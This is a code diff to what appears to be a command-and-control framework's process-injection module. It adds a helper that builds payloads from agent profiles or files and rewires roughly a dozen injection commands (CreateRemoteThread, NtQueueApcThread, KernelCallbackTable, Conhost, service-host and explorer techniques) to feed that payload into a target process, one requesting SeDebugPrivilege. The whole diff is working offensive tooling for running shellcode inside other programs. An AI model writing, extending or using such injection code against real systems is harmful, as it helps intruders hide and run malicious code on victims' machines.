@@ -8,6 +8,45 @@ from os.path       import exists, dirname, basename
 CURRENT_DIR  = dirname( __file__ )
 CACHE_OBJECT = False
 
+
+def resolve_payload( cmd, payload_name: str ) -> bytes:
+    """
+    resolve payload from either:
+    1. a file path (if exists)
+    2. a payload profile by name
+    3. a popup selector (if nothing specified)
+    """
+    payload_buffer = b''
+
+    if exists( payload_name ):
+        #
+        # payload is a file path
+        #
+        payload_buffer = file_read( payload_name )
+    else:
+        if len( payload_name ) == 0:
+            #
+            # if no profile has been specified then we are going to show a
+            # popup for the operator to select the payload they can use for injection
+            #
+            profile = HcAgentProfileSelect()
+
+            if profile is None:
+                cmd.log_error( 'no payload profile has been specified!' )
+                return None
+
+            payload_name = profile[ 'name' ]
+        else:
+            try:
+                profile = HcAgentProfileQuery( payload_name )
+            except Exception as e:
+                cmd.log_error( f'profile error: {e}' )
+                return None
+
+        payload_buffer = HcAgentProfileBuild( profile[ 'type' ], profile[ 'profile' ] )
+
+    return payload_buffer
+
 ##
 ## this are some util functions and the InjectionTaskBase
 ## base object which every injection command will inherit
@@ -143,22 +182,24 @@ class ObjectCreateRemoteThreadTask( InjectionTaskBase ):
             "   PID        Required. The PID to inject into. Enter '0' as the PID to\n"
             "              have the agent use the spawnto to create a temporary\n"
             "              process to inject into.\n"
-            "   SHELLCODE  Required. The file name of the shellcode to inject.\n"
+            "   PAYLOAD    Optional. File path or payload profile name. If not\n"
+            "              specified, a popup will appear to select a profile.\n"
         )
 
         parser.add_argument( 'PID', type=int, help='target PID (0 = spawn temporary process)' )
-        parser.add_argument( 'SHELLCODE', type=str, help='path to shellcode file' )
+        parser.add_argument( 'PAYLOAD', nargs='*', type=str, help='file path or payload profile name' )
 
     async def execute( self, args ):
         if args.PID < 0 or args.PID > 65535:
             self.log_error( 'invalid PID: must be between 0-65535' )
             return
 
-        if not exists( args.SHELLCODE ):
-            self.log_error( f"shellcode file not found: {args.SHELLCODE}" )
-            return
 
-        shellcode = file_read( args.SHELLCODE )
+        payload_name = ' '.join( args.PAYLOAD )
+        shellcode = resolve_payload( self, payload_name )
+
+        if shellcode is None:
+            return
 
         return await self.execute_object(
             argv        = bof_pack( 'ib', args.PID, shellcode ),
@@ -179,22 +220,24 @@ class ObjectSetThreadContextTask( InjectionTaskBase ):
             "   PID        Required. The PID to inject into. Enter '0' as the PID to\n"
             "              have the agent use the spawnto to create a temporary\n"
             "              process to inject into.\n"
-            "   SHELLCODE  Required. The file name of the shellcode to inject.\n"
+            "   PAYLOAD    Optional. File path or payload profile name. If not\n"
+            "              specified, a popup will appear to select a profile.\n"
         )
 
         parser.add_argument( 'PID', type=int, help='target PID (0 = spawn temporary process)' )
-        parser.add_argument( 'SHELLCODE', type=str, help='path to shellcode file' )
+        parser.add_argument( 'PAYLOAD', nargs='*', type=str, help='file path or payload profile name' )
 
     async def execute( self, args ):
         if args.PID < 0 or args.PID > 65535:
             self.log_error( 'invalid PID: must be between 0-65535' )
             return
 
-        if not exists( args.SHELLCODE ):
-            self.log_error( f"shellcode file not found: {args.SHELLCODE}" )
-            return
 
-        shellcode = file_read( args.SHELLCODE )
+        payload_name = ' '.join( args.PAYLOAD )
+        shellcode = resolve_payload( self, payload_name )
+
+        if shellcode is None:
+            return
 
         return await self.execute_object(
             argv        = bof_pack( 'ib', args.PID, shellcode ),
@@ -216,22 +259,24 @@ class ObjectNtCreateThreadTask( InjectionTaskBase ):
             "   PID        Required. The PID to inject into. Enter '0' as the PID to\n"
             "              have the agent use the spawnto to create a temporary\n"
             "              process to inject into.\n"
-            "   SHELLCODE  Required. The file name of the shellcode to inject.\n"
+            "   PAYLOAD    Optional. File path or payload profile name. If not\n"
+            "              specified, a popup will appear to select a profile.\n"
         )
 
         parser.add_argument( 'PID', type=int, help='target PID (0 = spawn temporary process)' )
-        parser.add_argument( 'SHELLCODE', type=str, help='path to shellcode file' )
+        parser.add_argument( 'PAYLOAD', nargs='*', type=str, help='file path or payload profile name' )
 
     async def execute( self, args ):
         if args.PID < 0 or args.PID > 65535:
             self.log_error( 'invalid PID: must be between 0-65535' )
             return
 
-        if not exists( args.SHELLCODE ):
-            self.log_error( f"shellcode file not found: {args.SHELLCODE}" )
-            return
 
-        shellcode = file_read( args.SHELLCODE )
+        payload_name = ' '.join( args.PAYLOAD )
+        shellcode = resolve_payload( self, payload_name )
+
+        if shellcode is None:
+            return
 
         return await self.execute_object(
             argv        = bof_pack( 'ib', args.PID, shellcode ),
@@ -253,22 +298,24 @@ class ObjectNtQueueApcThreadTask( InjectionTaskBase ):
             "   PID        Required. The PID to inject into. Enter '0' as the PID to\n"
             "              have the agent use the spawnto to create a temporary\n"
             "              process to inject into.\n"
-            "   SHELLCODE  Required. The file name of the shellcode to inject.\n"
+            "   PAYLOAD    Optional. File path or payload profile name. If not\n"
+            "              specified, a popup will appear to select a profile.\n"
         )
 
         parser.add_argument( 'PID', type=int, help='target PID (0 = spawn temporary process)' )
-        parser.add_argument( 'SHELLCODE', type=str, help='path to shellcode file' )
+        parser.add_argument( 'PAYLOAD', nargs='*', type=str, help='file path or payload profile name' )
 
     async def execute( self, args ):
         if args.PID < 0 or args.PID > 65535:
             self.log_error( 'invalid PID: must be between 0-65535' )
             return
 
-        if not exists( args.SHELLCODE ):
-            self.log_error( f"shellcode file not found: {args.SHELLCODE}" )
-            return
 
-        shellcode = file_read( args.SHELLCODE )
+        payload_name = ' '.join( args.PAYLOAD )
+        shellcode = resolve_payload( self, payload_name )
+
+        if shellcode is None:
+            return
 
         return await self.execute_object(
             argv        = bof_pack( 'ib', args.PID, shellcode ),
@@ -292,22 +339,24 @@ class ObjectKernelCallbackTableTask( InjectionTaskBase ):
             "              have the agent use the spawnto to create a temporary\n"
             "              process to inject into, but this will not work with the\n"
             "              default of rundll32.exe.\n"
-            "   SHELLCODE  Required. The file name of the shellcode to inject.\n"
+            "   PAYLOAD    Optional. File path or payload profile name. If not\n"
+            "              specified, a popup will appear to select a profile.\n"
         )
 
         parser.add_argument( 'PID', type=int, help='target PID (must be a GUI process)' )
-        parser.add_argument( 'SHELLCODE', type=str, help='path to shellcode file' )
+        parser.add_argument( 'PAYLOAD', nargs='*', type=str, help='file path or payload profile name' )
 
     async def execute( self, args ):
         if args.PID < 0 or args.PID > 65535:
             self.log_error( 'invalid PID: must be between 0-65535' )
             return
 
-        if not exists( args.SHELLCODE ):
-            self.log_error( f"shellcode file not found: {args.SHELLCODE}" )
-            return
 
-        shellcode = file_read( args.SHELLCODE )
+        payload_name = ' '.join( args.PAYLOAD )
+        shellcode = resolve_payload( self, payload_name )
+
+        if shellcode is None:
+            return
 
         return await self.execute_object(
             argv        = bof_pack( 'ib', args.PID, shellcode ),
@@ -331,22 +380,24 @@ class ObjectTooltipTask( InjectionTaskBase ):
             "              have the agent use the spawnto to create a temporary\n"
             "              process to inject into, but this will not work with the\n"
             "              default of rundll32.exe.\n"
-            "   SHELLCODE  Required. The file name of the shellcode to inject.\n"
+            "   PAYLOAD    Optional. File path or payload profile name. If not\n"
+            "              specified, a popup will appear to select a profile.\n"
         )
 
         parser.add_argument( 'PID', type=int, help='target PID (must have tooltip windows)' )
-        parser.add_argument( 'SHELLCODE', type=str, help='path to shellcode file' )
+        parser.add_argument( 'PAYLOAD', nargs='*', type=str, help='file path or payload profile name' )
 
     async def execute( self, args ):
         if args.PID < 0 or args.PID > 65535:
             self.log_error( 'invalid PID: must be between 0-65535' )
             return
 
-        if not exists( args.SHELLCODE ):
-            self.log_error( f"shellcode file not found: {args.SHELLCODE}" )
-            return
 
-        shellcode = file_read( args.SHELLCODE )
+        payload_name = ' '.join( args.PAYLOAD )
+        shellcode = resolve_payload( self, payload_name )
+
+        if shellcode is None:
+            return
 
         return await self.execute_object(
             argv        = bof_pack( 'ib', args.PID, shellcode ),
@@ -372,22 +423,24 @@ class ObjectClipboardInjectTask( InjectionTaskBase ):
             "              have the agent use the spawnto to create a temporary\n"
             "              process to inject into, but this will not work with the\n"
             "              default of rundll32.exe.\n"
-            "   SHELLCODE  Required. The file name of the shellcode to inject.\n"
+            "   PAYLOAD    Optional. File path or payload profile name. If not\n"
+            "              specified, a popup will appear to select a profile.\n"
         )
 
         parser.add_argument( 'PID', type=int, help='target PID (must have clipboard window)' )
-        parser.add_argument( 'SHELLCODE', type=str, help='path to shellcode file' )
+        parser.add_argument( 'PAYLOAD', nargs='*', type=str, help='file path or payload profile name' )
 
     async def execute( self, args ):
         if args.PID < 0 or args.PID > 65535:
             self.log_error( 'invalid PID: must be between 0-65535' )
             return
 
-        if not exists( args.SHELLCODE ):
-            self.log_error( f"shellcode file not found: {args.SHELLCODE}" )
-            return
 
-        shellcode = file_read( args.SHELLCODE )
+        payload_name = ' '.join( args.PAYLOAD )
+        shellcode = resolve_payload( self, payload_name )
+
+        if shellcode is None:
+            return
 
         return await self.execute_object(
             argv        = bof_pack( 'ib', args.PID, shellcode ),
@@ -414,22 +467,24 @@ class ObjectConhostTask( InjectionTaskBase ):
             "              have the agent use the spawnto to create a temporary\n"
             "              process to inject into, but this will not work with the\n"
             "              default of rundll32.exe.\n"
-            "   SHELLCODE  Required. The file name of the shellcode to inject.\n"
+            "   PAYLOAD    Optional. File path or payload profile name. If not\n"
+            "              specified, a popup will appear to select a profile.\n"
         )
 
         parser.add_argument( 'PID', type=int, help='target conhost.exe PID' )
-        parser.add_argument( 'SHELLCODE', type=str, help='path to shellcode file' )
+        parser.add_argument( 'PAYLOAD', nargs='*', type=str, help='file path or payload profile name' )
 
     async def execute( self, args ):
         if args.PID < 0 or args.PID > 65535:
             self.log_error( 'invalid PID: must be between 0-65535' )
             return
 
-        if not exists( args.SHELLCODE ):
-            self.log_error( f"shellcode file not found: {args.SHELLCODE}" )
-            return
 
-        shellcode = file_read( args.SHELLCODE )
+        payload_name = ' '.join( args.PAYLOAD )
+        shellcode = resolve_payload( self, payload_name )
+
+        if shellcode is None:
+            return
 
         return await self.execute_object(
             argv        = bof_pack( 'ib', args.PID, shellcode ),
@@ -451,22 +506,24 @@ class ObjectSvcCtrlTask( InjectionTaskBase ):
             "   be hosting services, e.g., svchost.exe or spoolsrv.exe.\n\n"
             "   PID        Required. The PID to inject into. This technique can only\n"
             "              target processes which are hosting services.\n"
-            "   SHELLCODE  Required. The file name of the shellcode to inject.\n"
+            "   PAYLOAD    Optional. File path or payload profile name. If not\n"
+            "              specified, a popup will appear to select a profile.\n"
         )
 
         parser.add_argument( 'PID', type=int, help='target PID (must be hosting services)' )
-        parser.add_argument( 'SHELLCODE', type=str, help='path to shellcode file' )
+        parser.add_argument( 'PAYLOAD', nargs='*', type=str, help='file path or payload profile name' )
 
     async def execute( self, args ):
         if args.PID < 0 or args.PID > 65535:
             self.log_error( 'invalid PID: must be between 0-65535' )
             return
 
-        if not exists( args.SHELLCODE ):
-            self.log_error( f"shellcode file not found: {args.SHELLCODE}" )
-            return
 
-        shellcode = file_read( args.SHELLCODE )
+        payload_name = ' '.join( args.PAYLOAD )
+        shellcode = resolve_payload( self, payload_name )
+
+        if shellcode is None:
+            return
 
         self.log_info( 'requesting SeDebugPrivilege' )
 
@@ -493,17 +550,19 @@ class ObjectUxSubclassInfoTask( InjectionTaskBase ):
             "   of the syscall commands from ntdll on disk. This can only target\n"
             "   explorer, so no need to specify the PID, but make sure your shellcode\n"
             "   won't kill the process or thread.\n\n"
-            "   SHELLCODE  Required. The file name of the shellcode to inject.\n"
+            "   PAYLOAD    Optional. File path or payload profile name. If not\n"
+            "              specified, a popup will appear to select a profile.\n"
         )
 
-        parser.add_argument( 'SHELLCODE', type=str, help='path to shellcode file' )
+        parser.add_argument( 'PAYLOAD', nargs='*', type=str, help='file path or payload profile name' )
 
     async def execute( self, args ):
-        if not exists( args.SHELLCODE ):
-            self.log_error( f"shellcode file not found: {args.SHELLCODE}" )
-            return
 
-        shellcode = file_read( args.SHELLCODE )
+        payload_name = ' '.join( args.PAYLOAD )
+        shellcode = resolve_payload( self, payload_name )
+
+        if shellcode is None:
+            return
 
         return await self.execute_object(
             argv        = bof_pack( 'b', shellcode ),
@@ -524,17 +583,19 @@ class ObjectCTrayTask( InjectionTaskBase ):
             "   syscall commands from ntdll on disk. This can only target explorer, so\n"
             "   no need to specify the PID, but make sure your shellcode won't kill\n"
             "   the process or thread.\n\n"
-            "   SHELLCODE  Required. The file name of the shellcode to inject.\n"
+            "   PAYLOAD    Optional. File path or payload profile name. If not\n"
+            "              specified, a popup will appear to select a profile.\n"
         )
 
-        parser.add_argument( 'SHELLCODE', type=str, help='path to shellcode file' )
+        parser.add_argument( 'PAYLOAD', nargs='*', type=str, help='file path or payload profile name' )
 
     async def execute( self, args ):
-        if not exists( args.SHELLCODE ):
-            self.log_error( f"shellcode file not found: {args.SHELLCODE}" )
-            return
 
-        shellcode = file_read( args.SHELLCODE )
+        payload_name = ' '.join( args.PAYLOAD )
+        shellcode = resolve_payload( self, payload_name )
+
+        if shellcode is None:
+            return
 
         return await self.execute_object(
             argv        = bof_pack( 'b', shellcode ),
@@ -555,19 +616,21 @@ class ObjectDDETask( InjectionTaskBase ):
             "   syscall commands from ntdll on disk. This can only target explorer, so\n"
             "   no need to specify the PID, but make sure your shellcode won't kill\n"
             "   the process or thread.\n\n"
-            "   SHELLCODE  Required. The file name of the shellcode to inject.\n\n"
+            "   PAYLOAD    Optional. File path or payload profile name. If not\n"
+            "              specified, a popup will appear to select a profile.\n\n"
             "Warning: The injection technique causes the shellcode to be executed FOUR\n"
             "         times so plan accordingly.\n"
         )
 
-        parser.add_argument( 'SHELLCODE', type=str, help='path to shellcode file' )
+        parser.add_argument( 'PAYLOAD', nargs='*', type=str, help='file path or payload profile name' )
 
     async def execute( self, args ):
-        if not exists( args.SHELLCODE ):
-            self.log_error( f"shellcode file not found: {args.SHELLCODE}" )
-            return
 
-        shellcode = file_read( args.SHELLCODE )
+        payload_name = ' '.join( args.PAYLOAD )
+        shellcode = resolve_payload( self, payload_name )
+
+        if shellcode is None:
+            return
 
         self.log_warn( 'DDE technique executes shellcode FOUR times!' )
 
